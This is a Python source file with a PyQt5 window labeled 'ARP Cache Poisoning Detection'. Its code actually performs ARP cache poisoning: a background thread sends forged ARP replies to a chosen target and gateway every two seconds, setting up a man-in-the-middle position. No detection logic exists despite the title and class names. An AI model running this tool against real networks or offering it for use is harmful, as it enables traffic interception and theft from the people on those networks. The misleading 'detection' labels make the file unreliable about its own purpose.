# arp_cache_poisoning.py
import time
from PyQt5.QtCore import QThread, pyqtSignal  # Import QThread and pyqtSignal
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QPushButton, QLabel, QLineEdit, QTextEdit
import sys
import scapy.all as scapy

# Function to get MAC address of a given IP
def get_mac(ip):
    try:
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet / arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception as e:
        return str(e)

# Function to perform ARP spoofing
def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        return str(e)

# Class for ARP Cache Poisoning Detection Window
class ARPCacheDetectionWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        target_ip_label = QLabel("Enter target IP:")
        layout.addWidget(target_ip_label)

        self.target_ip_edit = QLineEdit()
        layout.addWidget(self.target_ip_edit)

        gateway_ip_label = QLabel("Enter gateway IP:")
        layout.addWidget(gateway_ip_label)

        self.gateway_ip_edit = QLineEdit()
        layout.addWidget(self.gateway_ip_edit)

        start_btn = QPushButton("Start", self)
        start_btn.clicked.connect(self.start_arp)
        layout.addWidget(start_btn)

        self.end_process_btn = QPushButton("End Process", self)
        self.end_process_btn.clicked.connect(self.end_process)
        layout.addWidget(self.end_process_btn)

        quit_btn = QPushButton("Quit", self)
        quit_btn.clicked.connect(self.close)
        layout.addWidget(quit_btn)

        self.result_text = QTextEdit()
        layout.addWidget(self.result_text)

        self.setLayout(layout)
        self.setWindowTitle('ARP Cache Poisoning Detection')

    def start_arp(self):
        target_ip = self.target_ip_edit.text()
        gateway_ip = self.gateway_ip_edit.text()
        self.thread = ArpCacheDetectionThread(target_ip, gateway_ip)
        self.thread.start()
        self.thread.arp_output.connect(self.append_output)

    def end_process(self):
        self.thread.stop()

    def append_output(self, text):
        self.result_text.append(text)

# Class for ARP Cache Poisoning Detection Thread
class ArpCacheDetectionThread(QThread):
    arp_output = pyqtSignal(str)

    def __init__(self, target_ip, gateway_ip):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        try:
            while self.running:
                spoof(self.target_ip, self.gateway_ip)
                spoof(self.gateway_ip, self.target_ip)
                self.arp_output.emit("[+] Sent spoofed ARP packets\n")
                time.sleep(2)
        except Exception as e:
            self.arp_output.emit(f"Error: {e}")
